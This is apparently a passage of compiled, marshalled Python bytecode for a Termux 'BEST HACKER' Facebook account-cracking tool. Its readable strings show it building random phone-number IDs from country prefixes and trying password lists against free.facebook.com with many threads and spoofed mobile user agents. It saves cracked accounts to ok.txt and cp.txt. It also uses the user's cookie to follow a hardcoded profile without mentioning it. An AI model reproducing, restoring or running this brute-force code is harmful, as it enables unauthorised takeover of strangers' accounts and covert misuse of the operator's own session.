d\x17d\x18\x84\x00Z!G\x00d\x19d\x05\x84\x00d\x05\x83\x02Z\x06d\x1aZ"d\x1bZ#d\x1cZ$d\x1dZ%d\x1eZ&d\x1fZ\'d\x1bZ(d\x1aZ)d Z*d!Z+d"Z,d#Z-d$Z.d%Z/d&Z0d\'Z1d(Z2d)Z3d*Z4d+Z5d,Z6d-Z7d.Z8e(e)e*e+e,e-e.e/g\x08Z9e\x0c\xa0:e9\xa1\x01Z;e\x15\xa0<\xa1\x00Z<e<\xa0=d/\xa1\x01Z>e\x15\xa0<\xa1\x00Z?e?j@ZAe?jBZCe?jDZEe\x16\xa0F\xa1\x00ZFd0Z\x07d\x00aGg\x00aHg\x00aId1d2\x84\x00ZJd\x00d3l\x02mKZL\x01\x00d\x00d4l\x00m\x05ZM\x01\x00eNeL\x83\x00d5\x19\x00\x83\x01ZOeOd6k\x04\x90\x01rCeOd6\x18\x00ZPd7ZQn\x04eOZPd8ZQz\x1aeRd9\x83\x01\x01\x00d:ZSd;ZTd;ZTeUeS\x83\x01eTv\x00\x90\x01r_e\x00\xa0\x05d2\xa1\x01\x01\x00n\x01\t\x00W\x00n\x08\x01\x00\x01\x00\x01\x00eRd<\x83\x01\x01\x00Y\x00d=d>\x84\x00ZVg\x00ZWg\x00ZXeYd?\x83\x01D\x00]`ZZd@Z[e\x0c\xa0:g\x00dA\xa2\x01\xa1\x01Z\\dBZ]e\x0c\xa0:g\x00dC\xa2\x01\xa1\x01Z^e\x0c\xa0_dDdE\xa1\x02Z`e\x0c\xa0:g\x00dC\xa2\x01\xa1\x01ZadFZbe\x0c\xa0_dGdH\xa1\x02ZcdIZde\x0c\xa0_dJdK\xa1\x02Zee\x0c\xa0_dLdM\xa1\x02ZfdNZge[\x9b\x00dOe\\\x9b\x00dPe]\x9b\x00e^\x9b\x00e`\x9b\x00ea\x9b\x00dQeb\x9b\x00ec\x9b\x00dRed\x9b\x00dRee\x9b\x00dRef\x9b\x00dOeg\x9b\x00\x9d\x13ZheX\xa0ieh\xa1\x01\x01\x00\x90\x01qvdSdT\x84\x00ZddUdV\x84\x00Zje\x08\x83\x00\x01\x00d\x01S\x00)W\xe9\x00\x00\x00\x00Nz\x08git pullz\x10pkg install curlc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00\xf3\x14\x00\x00\x00e\x00Z\x01d\x00Z\x02d\x01d\x02\x84\x00Z\x03d\x03S\x00)\x04\xda\x05jalanc\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00C\x00\x00\x00s\x04\x00\x00\x00d\x00S\x00\xa9\x01N\xa9\x00)\x02\xda\x04self\xda\x01zr\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\x06<code>\xda\x08__init__\x17\x00\x00\x00s\x02\x00\x00\x00\x04\x02\xfa\x0ejalan.__init__N\xa9\x04\xda\x08__name__\xda\n__module__\xda\x0c__qualname__r\t\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x03\x00\x00\x00\x13\x00\x00\x00s\x04\x00\x00\x00\x08\x00\x0c\x04r\x03\x00\x00\x00a\x03\x04\x00\x00   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mBEST-HACKER\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mBEST\x1b[0;m\x1b[1;32m HACKER \x1b[1;33mEDRIS\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m BEST HACKER\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mBEST-HACKER\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE BY BEST HACKER\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mBEST HACKER\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m1.0\n\x1b[1;37m================= \x1b[32;45mBEST-HACKER\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO BEST HACKER TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mAFG\x1b[0;m ======================\nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00sR\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00t\x04d\x02\x83\x01\x01\x00t\x04d\x03\x83\x01\x01\x00t\x05d\x04\x83\x01}\x00|\x00d\x05k\x02r#t\x00\xa0\x01d\x06\xa1\x01\x01\x00t\x06\x83\x00\x01\x00d\x00S\x00d\x00d\x07\x83\x01\x01\x00d\x00S\x00)\x08N\xda\x05clearz" [1] SUBSCRIBE CHANNEL BEST HACKER\xfa\t [2] EXITz\x16\n   Choose option >>> \xda\x011z/xdg-open https://youtube.com/c/BestHacker004200\xfa\x13\n\x1b[1;31mEXIT\x1b[0;97m)\x07\xda\x02os\xda\x06systemr\x03\x00\x00\x00\xda\x04logo\xda\x05print\xda\x05input\xda\x02FD\xa9\x01Z\x03optr\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x02ud\x1d\x00\x00\x00\xf3\x14\x00\x00\x00\n\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\n\x02\x06\x02\x04\x02\x0c\x02r\x1a\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00sR\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00t\x02d\x02\x83\x01\x01\x00t\x02d\x03\x83\x01\x01\x00t\x04d\x04\x83\x01}\x00|\x00d\x05k\x02r#t\x00\xa0\x01d\x06\xa1\x01\x01\x00t\x05\x83\x00\x01\x00d\x00S\x00d\x00d\x07\x83\x01\x01\x00d\x00S\x00)\x08Nr\x0f\x00\x00\x00z#\x1b[1;33m [1] JOINED TELEGRAM CHANNELr\x10\x00\x00\x00z\x1d\n  \x1b[1;32m Choose option >>> r\x11\x00\x00\x00z&xdg-open https://t.me/Best_Hacker00420r\x12\x00\x00\x00)\x06r\x13\x00\x00\x00r\x14\x00\x00\x00r\x16\x00\x00\x00r\x15\x00\x00\x00r\x17\x00\x00\x00\xda\x01or\x19\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x18\x00\x00\x003\x00\x00\x00r\x1b\x00\x00\x00r\x18\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\xa6\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00t\x02d\x02\x83\x01\x01\x00t\x04d\x03\x83\x01\x01\x00t\x02d\x04\x83\x01\x01\x00t\x02d\x05\x83\x01\x01\x00t\x02d\x06\x83\x01\x01\x00t\x02d\x07\x83\x01\x01\x00t\x05d\x08\x83\x01}\x00|\x00d\tk\x02r,t\x06\x83\x00\x01\x00d\x00d\nk\x02r7t\x00\xa0\x01d\x0b\xa1\x01\x01\x00d\x00S\x00d\x00d\x0ck\x02rBt\x00\xa0\x01d\r\xa1\x01\x01\x00d\x00S\x00d\x00d\x0ek\x02rMt\x00\xa0\x01d\x0f\xa1\x01\x01\x00d\x00S\x00d\x00d\x10\x83\x01\x01\x00d\x00S\x00)\x11Nr\x0f\x00\x00\x00u$\x00\x00\x00\t\xf0\x9f\x94\xa5\xf0\x9f\x94\xa5RANDOM NUMBER CRACK\xf0\x9f\x94\xa5\xf0\x9f\x94\xa5\xda\x00z \x1b[1;32m [1]\x1b[1;33m RANDOM CRACK z \x1b[1;32m [2] \x1b[1;32mJOIN TELEGRAMz\x1f \x1b[1;32m[3] \x1b[1;32mJOIN FB PAGEz\x18 \x1b[1;32m[00] \x1b[1;31mEXITz\x1e\n   \x1b[1;32m Choose option >>> r\x11\x00\x00\x00\xda\x012z\x1exdg-open t.me/Best_Hacker00420\xda\x013z2xdg-open https://www.facebook.com/Best_hacker00420\xda\x010\xda\x04exitz$\n\x1b[1;31m  Choose valid option\x1b[0;97m)\x07r\x13\x00\x00\x00r\x14\x00\x00\x00r\x03\x00\x00\x00r\x15\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\xda\x01ir\x19\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x1c\x00\x00\x00I\x00\x00\x00s*\x00\x00\x00\n\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x06\x02\x08\x02\n\x02\x04\x02\x08\x02\n\x02\x04\x04\x08\x02\n\x02\x04\x02\x0c\x02r\x1c\x00\x00\x00)\x01\xda\rBeautifulSoup)\x01\xda\x04date)\x01\xda\x08datetime)\x01\xda\x05sleep)\x01\xda\x12ThreadPoolExecutor)\x01\xda\x0fConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullz\x0fpip install bs4c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\t\x00\x00\x00C\x00\x00\x00sf\x01\x00\x00|\x00j\x00d\x01d\x02|\x01i\x01d\x03\x8d\x02j\x01}\x02t\x02|\x02d\x04\x83\x02}\x03|\x03j\x03d\x05d\x06d\x07\x8d\x02}\x04d\x08d\t\x84\x00|\x04\xa0\x04d\n\xa1\x01D\x00\x83\x01}\x05t\x05|\x05\x83\x01d\x0bk\x02r2t\x06d\x0ct\x07t\x08t\x07t\x08t\x07f\x05\x16\x00\x83\x01\x01\x00n$t\x06d\rt\t\x9b\x00\x9d\x02t\n\x16\x00\x83\x01\x01\x00t\x0bt\x05|\x05\x83\x01\x83\x01D\x00]\x14}\x06t\x06d\x0et\x07|\x06d\x0f\x17\x00|\x05|\x06\x19\x00\xa0\x0cd\x10d\x11\xa1\x02t\x07f\x04\x16\x00\x83\x01\x01\x00qA|\x00j\x00d\x12d\x02|\x01i\x01d\x03\x8d\x02j\x01}\x02t\x02|\x02d\x04\x83\x02}\x03|\x03j\x03d\x05d\x06d\x07\x8d\x02}\x04d\x13d\t\x84\x00|\x04\xa0\x04d\n\xa1\x01D\x00\x83\x01}\x05t\x05|\x05\x83\x01d\x0bk\x02r\x89t\x06d\x14t\x07t\x08t\x07t\x08t\x07f\x05\x16\x00\x83\x01\x01\x00d\x00S\x00t\x06d\x15t\t\x9b\x00\x9d\x02t\x08\x16\x00\x83\x01\x01\x00t\x0bt\x05|\x05\x83\x01\x83\x01D\x00]\x14}\x06t\x06d\x0et\x07|\x06d\x0f\x17\x00|\x05|\x06\x19\x00\xa0\x0cd\x16d\x17\xa1\x02t\x07f\x04\x16\x00\x83\x01\x01\x00q\x98t\x06d\x18\x83\x01\x01\x00d\x00S\x00)\x19Nz:https://free.facebook.com/settings/apps/tabbed/?tab=active\xda\x06cookie\xa9\x01\xda\x07cookies\xfa\x0bhtml.parserZ\x04form\xda\x04post)\x01\xda\x06methodc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00S\x00\x00\x00\xf3\x12\x00\x00\x00g\x00|\x00]\x05}\x01|\x01j\x00\x91\x02q\x02S\x00r\x05\x00\x00\x00\xa9\x01\xda\x04text\xa9\x02\xda\x02.0r"\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\n<listcomp>\xa3\x00\x00\x00\xf3\x02\x00\x00\x00\x12\x00z\x1bcek_apk.<locals>.<listcomp>Z\x02h3r\x01\x00\x00\x00z.\r%s[%s!%s] %sSorry there is no Active  Apk%s  u1\x00\x00\x00\r[\xf0\x9f\x8e\xae] %s \x1b[1;95m \xe2\x98\x86 Your Active Apps \xe2\x98\x86     :z\x0c\r[%s%s] %s%s\xe9\x01\x00\x00\x00z\x10Ditambahkan padaz\x11 Ditambahkan padaz<https://free.facebook.com/settings/apps/tabbed/?tab=inactivec\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00S\x00\x00\x00r/\x00\x00\x00r\x05\x00\x00\x00r0\x00\x00\x00r2\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r4\x00\x00\x00\xbb\x00\x00\x00r5\x00\x00\x00z8\r%s[%s!%s] %sSorry there is no Expired Apk%s           \nu1\x00\x00\x00\r[\xf0\x9f\x8e\xae] %s \x1b[1;95m \xe2\x97\x87 Your Expired Apps \xe2\x97\x87    :Z\x0bKedaluwarsaz\x0c Kedaluwarsar\x1d\x00\x00\x00)\r\xda\x03getr1\x00\x00\x00r#\x00\x00\x00\xda\x04findZ\x08find_all\xda\x03lenr\x16\x00\x00\x00\xda\x01N\xda\x01M\xda\x05WHITE\xda\x05GREEN\xda\x05range\xda\x07replace)\x07\xda\x07session\xda\x04coki\xda\x01w\xda\x03sop\xda\x01xZ\x04gamer"\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x07cek_apk\x9b\x00\x00\x00s&\x00\x00\x00\x14\x02\n\x02\x0e\x02\x14\x02\x0c\x02\x18\x02\x12\x04\x10\x02&\x02\x14\x06\n\x02\x0e\x02\x14\x02\x0c\x02\x1a\x02\x12\x04\x10\x02&\x02\x0c\x04rE\x00\x00\x00c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\\\x00\x00\x00t\x00|\x01j\x01d\x01d\x02|\x02i\x01f\x02i\x00d\x03\xa4\x01\x8e\x01j\x02d\x04\x83\x02}\x03|\x03j\x03d\ni\x00d\x07\xa4\x01\x8e\x01\xa0\x01d\x08\xa1\x01}\x04|\x01j\x01d\tt\x04|\x04\x83\x01\x17\x00d\x02|\x02i\x01f\x02i\x00d\x03\xa4\x01\x8e\x01j\x02\x01\x00d\x00S\x00)\x0bNz8https://free.facebook.com/profile.php?id=100015315258519r)\x00\x00\x00r*\x00\x00\x00r,\x00\x00\x00\xda\x01a\xda\x05Ikuti)\x01\xda\x06stringZ\x04href\xfa\x19https://free.facebook.com)\x02rF\x00\x00\x00rG\x00\x00\x00)\x05r#\x00\x00\x00r7\x00\x00\x00r1\x00\x00\x00r8\x00\x00\x00\xda\x03str)\x05r\x06\x00\x00\x00r@\x00\x00\x00rA\x00\x00\x00\xda\x01rr7\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x06follow\xcf\x00\x00\x00s\x1c\x00\x00\x00\x08\x02\x04\x02\x06\xfe\x02\x02\x04\xfe\x04\x02\x04\xfe\x16\x04\x0e\x02\x04\x02\x06\xfe\x02\x02\x04\xfe\x08\x02rL\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00r\x02\x00\x00\x00)\x04r\x03\x00\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s2\x00\x00\x00|\x01d\x01\x17\x00D\x00]\x12}\x02t\x00j\x01\xa0\x02|\x02\xa1\x01\x01\x00t\x00j\x01\xa0\x03\xa1\x00\x01\x00t\x04\xa0\x05d\x02\xa1\x01\x01\x00q\x04d\x00S\x00)\x03N\xda\x01\ng;\xdfO\x8d\x97n\x82?)\x06\xda\x03sys\xda\x06stdout\xda\x05write\xda\x05flush\xda\x04timer&\x00\x00\x00)\x03r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x01er\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xe3\x00\x00\x00s\n\x00\x00\x00\x0c\x02\x0c\x02\n\x02\x0c\x02\x04\xfar\n\x00\x00\x00Nr\x0b\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x03\x00\x00\x00\xe1\x00\x00\x00s\x04\x00\x00\x00\x08\x00\x0c\x02z\x07\x1b[1;91mz\x07\x1b[1;97mz\x07\x1b[1;32mz\x07\x1b[1;33mz\x07\x1b[1;34mz\x07\x1b[1;35mz\x07\x1b[1;92mz\x07\x1b[1;93mz\x07\x1b[1;94mz\x07\x1b[1;95mz\x07\x1b[1;96mz\x04\x1b[0mz\x07\x1b[1;90mz\x08\x1b[1;107mz\x08\x1b[1;106mz\x08\x1b[1;105mz\x08\x1b[1;104mz\x08\x1b[1;103mz\x08\x1b[1;102mz\x08\x1b[1;101mz\x08\x1b[1;100mz\x05%H:%Ma\x94\x06\x00\x00   \n\n\x1b[1;32m       BBBBBBBBBBBBBBBBB       HHHHHHHH       HHHHHHHH\n\n\x1b[1;35m       B::::::::::::::::B      H::::::H        H::::::H\n\n\x1b[1;35m       B::::::BBBBBB:::::B     H::::::H        H::::::H\n\n\x1b[1;32m       B:::::B     B:::::B     H::::::H        H::::::H\n\n\x1b[1;32m       B::::B       B:::::B    HHHHHHHH        HHHHHHHH\n\n\x1b[1;35m       B::::B      B:::::B     HHHHHHHH        HHHHHHHH\n\n\x1b[1;35m       B::::BBBBBB:::::B       H::::::H HHHHHH H::::::H\n\n\x1b[1;32m       B:::::::::::::BB        H::::::H HHHHHH H::::::H\n\n\x1b[1;32m       B::::BBBBBB:::::B       H::::::H HHHHHH H::::::H\n\n\x1b[1;35m       B::::B      B:::::B     H::::::H        H::::::H\n\n\x1b[1;35m       B::::B       B:::::B    H::::::H        H::::::H\n\n\x1b[1;32m       B::::B      B:::::B     H::::::H        H::::::H\n\n\x1b[1;32m       BB:::::BBBBBB::::::B    H::::::H        H::::::H\n\n\x1b[1;35m       B:::::::::::::::::B     H::::::H        H::::::H\n\n\x1b[1;35m       B::::::::::::::::B      H::::::H        H::::::H\n\n\x1b[1;32m       BBBBBBBBBBBBBBBBB       HHHHHHHH        HHHHHHHH   \n\n \n\n\x1b[1;37m================= \x1b[32;45mBEST Hacker\x1b[0;m =====================\n\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mBEST\x1b[0;m\x1b[1;32m HACKER \x1b[1;33mEDRIS NABIZADA\x1b[0;m\n\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m BEST HACKER\n\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM BEST HACKER\n\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE BY BEST HACKER\n\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mBEST HACKER\n\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m1.0\n\n\x1b[1;37m================= \x1b[32;45mBEST\x1b[0;m =====================\n\n \n\n       \x1b[37;41m\t WELLCOME TO BEST HACKER TOOL\x1b[0;m\n\n \n\n\x1b[1;37m================== \x1b[32;45mAFG\x1b[0;m ======================\nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00d\x00S\x00)\x02Nr\x0f\x00\x00\x00)\x04r\x13\x00\x00\x00r\x14\x00\x00\x00r\x16\x00\x00\x00r\x15\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x0f\x00\x00\x00u\x01\x00\x00s\x04\x00\x00\x00\n\x02\x0c\x02r\x0f\x00\x00\x00)\x01\xda\tlocaltime)\x01r\x14\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0c\x00\x00\x00Z\x02PMZ\x02AMz(\n\n\x1b[1;33mLoading asset files ... \x1b[0;97mg\xcd\xcc\xcc\xcc\xcc\xcc\x14@z\x035.2z*\n\x1b[1;31mNo internet connection ... \x1b[0;97mc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s<\x00\x00\x00g\x00d\x01\xa2\x01}\x01|\x01D\x00]\x15}\x02t\x00d\x02|\x00\x17\x00|\x02\x17\x00\x83\x01f\x01\x01\x00t\x01j\x02\xa0\x03\xa1\x00\x01\x00t\x04\xa0\x05d\x03\xa1\x01\x01\x00q\x06d\x00S\x00)\x04N)\x04z\x04.   z\x04..  z\x04... z\x05.... \xfa\x01\rr6\x00\x00\x00)\x06r\x16\x00\x00\x00rN\x00\x00\x00rO\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r&\x00\x00\x00)\x03r1\x00\x00\x00Z\x05titikr\x1c\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x07dynamic\xa5\x01\x00\x00s\n\x00\x00\x00\x08\x02\x08\x02\x12\x02\x16\x02\x04\xfcrX\x00\x00\x00i\x10\'\x00\x00z\x1eMozilla/5.0 (Linux; U; Android)\x0fr\x1f\x00\x00\x00\xda\x014\xda\x015\xda\x016\xda\x017\xda\x018\xda\x019Z\x0210Z\x0211Z\x0212Z\x0213Z\x0214Z\x0215Z\x0216Z\x0217z\x0b en-us; GT-)\x1a\xda\x01A\xda\x01B\xda\x01C\xda\x01D\xda\x01E\xda\x01F\xda\x01G\xda\x01H\xda\x01I\xda\x01J\xda\x01K\xda\x01Lr;\x00\x00\x00r:\x00\x00\x00\xda\x01O\xda\x01P\xda\x01Q\xda\x01R\xda\x01S\xda\x01T\xda\x01U\xda\x01V\xda\x01W\xda\x01X\xda\x01Y\xda\x01Zr6\x00\x00\x00i\xe7\x03\x00\x00z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/\xe9I\x00\x00\x00\xe9d\x00\x00\x00r \x00\x00\x00ih\x10\x00\x00i$\x13\x00\x00\xe9(\x00\x00\x00\xe9\x96\x00\x00\x00z\x13Mobile Edris/537.36\xfa\x01 z\x02; z\x02) \xda\x01.c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x08\x00\x00\x00C\x00\x00\x00s\xcc\x01\x00\x00g\x00}\x00g\x00}\x01t\x00j\x01\x01\x00t\x00j\x02\x01\x00t\x00\xa0\x03d\x01\xa1\x01\x01\x00t\x04t\x05\x83\x01\x01\x00t\x04d\x02\x83\x01\x01\x00t\x04d\x03\x83\x01\x01\x00t\x04d\x04\x83\x01\x01\x00t\x04d\x05\x83\x01\x01\x00t\x04d\x04\x83\x01\x01\x00t\x04d\x06\x83\x01\x01\x00t\x04d\x07\x83\x01\x01\x00t\x04d\x08\x83\x01\x01\x00t\x04d\x07\x83\x01\x01\x00t\x06d\t\x83\x01}\x02t\x07d\n\x83\x01\x01\x00t\x08t\x06d\x0b\x83\x01\x83\x01}\x03t\t|\x03\x83\x01D\x00]\x13}\x04d\n\xa0\nd\x0cd\r\x84\x00t\td\x0e\x83\x01D\x00\x83\x01\xa1\x01}\x05|\x00\xa0\x0b|\x05\xa1\x01\x01\x00qIt\x00\xa0\x03d\x01\xa1\x01\x01\x00t\x07t\x05\x83\x01\x01\x00t\x08t\x06d\x0f\x83\x01\x83\x01}\x06g\x00}\x07t\x07d\n\x83\x01\x01\x00t\t|\x06\x83\x01D\x00]\x0b}\x08t\x06d\x10\x83\x01}\t|\x07\xa0\x0b|\t\xa1\x01\x01\x00qvt\x0cd\x11d\x12\x8d\x01\x8fE}\nt\r\x83\x00\x01\x00t\x0et\x0f|\x00\x83\x01\x83\x01}\x0bt\x07d\x13|\x0b\x17\x00\x83\x01\x01\x00t\x07d\x14\x83\x01\x01\x00t\x07d\x15\x83\x01\x01\x00t\x07d\x04\x83\x01\x01\x00|\x00D\x00]\x1f}\x0c|\x0cd\x16d\x00\x85\x02\x19\x00g\x01}\r|\x02|\x0c\x17\x00}\x0e|\x07D\x00]\x07}\x0f|\r\xa0\x0b|\x0f\xa1\x01\x01\x00q\xb4|\n\xa0\x10t\x11|\x0e|\r|\x0b\xa1\x04\x01\x00q\xa5W\x00d\x00\x04\x00\x04\x00\x83\x03\x01\x00n\x081\x00s\xcfw\x01\x01\x00\x01\x00\x01\x00Y\x00\x01\x00t\x07d\x04\x83\x01\x01\x00t\x07d\x17\x83\x01\x01\x00t\x07d\x18\x83\x01\x01\x00t\x07d\x04\x83\x01\x01\x00d\x00S\x00)\x19Nr\x0f\x00\x00\x00z"\x1b[1;37m\t \x1a USE OUR COUNTRY CODE \x1a zc\x1b[1;36m     \t     PAK CODES\n     \x1b[1;33m92301, \x1b[1;33m92302 ,\x1b[1;33m92303 ,\x1b[1;33m92305  ...\x1b[0;97mz3\x1b[1;32m============================================ze\x1b[1;36m     \t     INDIA CODES\n     \x1b[1;33m91778, \x1b[1;33m91930 ,\x1b[1;33m91902 ,\x1b[1;33m91712  ...\x1b[0;97mzb\x1b[1;36m     \t     BD CODES\n     \x1b[1;33m88016, \x1b[1;33m88017 ,\x1b[1;33m88018 ,\x1b[1;33m88019  ...\x1b[0;97mz4\x1b[1;32m============================================\nzc\x1b[1;36m     \t     AFG CODES\n     \x1b[1;33m93780, \x1b[1;33m93799 ,\x1b[1;33m93701 ,\x1b[1;33m93777  ...\x1b[0;97mz\x0c PUT CODE : r\x1d\x00\x00\x00z9 EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00s\x00\x00\x00s\x1c\x00\x00\x00\x81\x00|\x00]\t}\x01t\x00\xa0\x01t\x02j\x03\xa1\x01V\x00\x01\x00q\x02d\x00S\x00r\x04\x00\x00\x00)\x04\xda\x06random\xda\x06choicerH\x00\x00\x00Z\x06digits)\x02r3\x00\x00\x00\xda\x01_r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\t<genexpr>\x06\x02\x00\x00s\x04\x00\x00\x00\x02\x80\x1a\x00z\x14i.<locals>.<genexpr>\xe9\x07\x00\x00\x00z\x1b[*] Enter Password Limit : z\x15[*] Enter Password : \xe92\x00\x00\x00)\x01Z\x0bmax_workersz\x13\x1b[1;36m TOTAL IDS: z$\x1b[1;36m THE PROCESS HAS BEEN STARTEDz*\x1b[1;31m USE AEROPLANE MOOD IN EVERY 2 MIN r6\x00\x00\x00z Crack process has been completedz\x1aIds saved in ok.txt,cp.txt)\x12r\x13\x00\x00\x00\xda\x06getuid\xda\x07geteuidr\x14\x00\x00\x00r\x03\x00\x00\x00r\x15\x00\x00\x00r\x17\x00\x00\x00r\x16\x00\x00\x00\xda\x03intr>\x00\x00\x00\xda\x04join\xda\x06append\xda\nThreadPoolr\x0f\x00\x00\x00rJ\x00\x00\x00r9\x00\x00\x00Z\x06submit\xda\x06rcrack)\x10\xda\x04userZ\x03twf\xda\x04codeZ\x05limitZ\x04nmbrZ\x03nmpZ\x05passxZ\x07HamiiIDZ\x05bilalZ\x03pwwZ\x08manshera\xda\x02tlZ\x04love\xda\x03pwx\xda\x03uidZ\x04Emanr\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r"\x00\x00\x00\xdb\x01\x00\x00s`\x00\x00\x00\x04\x02\x04\x02\x06\x02\x06\x02\n\x02\x08\x02\x08\x06\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x01\x08\x02\x08\x02\x08\x02\x0c\x02\x0c\x02\x18\x02\x0c\x02\n\x02\x08\x02\x0c\x02\x04\x02\x08\x02\x0c\x02\x08\x02\x0c\x02\x0c\x02\x06\x02\x0c\x02\x0c\x02\x08\x02\x08\x02\x08\x02\x08\x02\x0e\x02\x08\x02\x08\x02\x0c\x02\x12\x02\x02\xf6\x1c\xf2\x08\x1a\x08\x02\x08\x02\x0c\x02r"\x00\x00\x00c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\x00\x00\x00\x0b\x00\x00\x00C\x00\x00\x00sp\x02\x00\x00\x90\x01z0|\x01D\x00\x90\x01]\x0e}\x03t\x00\xa0\x01t\x02\xa1\x01}\x04t\x03\xa0\x04\xa1\x00}\x05|\x05\xa0\x05d\x01\xa1\x01j\x06}\x06t\x07\xa0\x08d\x02t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01t\x07\xa0\x08d\x04t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01t\x07\xa0\x08d\x05t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01t\x07\xa0\x08d\x06t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01d\x07d\x07|\x00|\x03d\x08d\t\x9c\t}\x07i\x00d\nd\x0b\x93\x01d\x0cd\r\x93\x01d\x0ed\x0f